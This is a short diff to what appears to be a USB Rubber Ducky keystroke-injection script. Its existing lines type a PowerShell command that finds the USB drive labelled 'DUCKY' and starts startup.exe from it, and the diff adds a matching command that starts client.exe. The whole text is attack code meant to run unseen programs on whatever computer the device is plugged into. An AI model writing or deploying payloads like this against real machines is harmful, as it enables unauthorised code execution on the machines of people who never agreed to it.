@@ -9,3 +9,6 @@ ENTER
 DELAY 500
 STRING powershell $usbPath = Get-WMIObject Win32_Volume -Filter "Label='DUCKY'" | Select-Object -ExpandProperty DriveLetter; Start-Process ($usbPath + '\startup.exe')
 ENTER
+DELAY 500
+STRING powershell $usbPath = Get-WMIObject Win32_Volume -Filter "Label='DUCKY'" | Select-Object -ExpandProperty DriveLetter; Start-Process ($usbPath + '\client.exe')
+ENTER
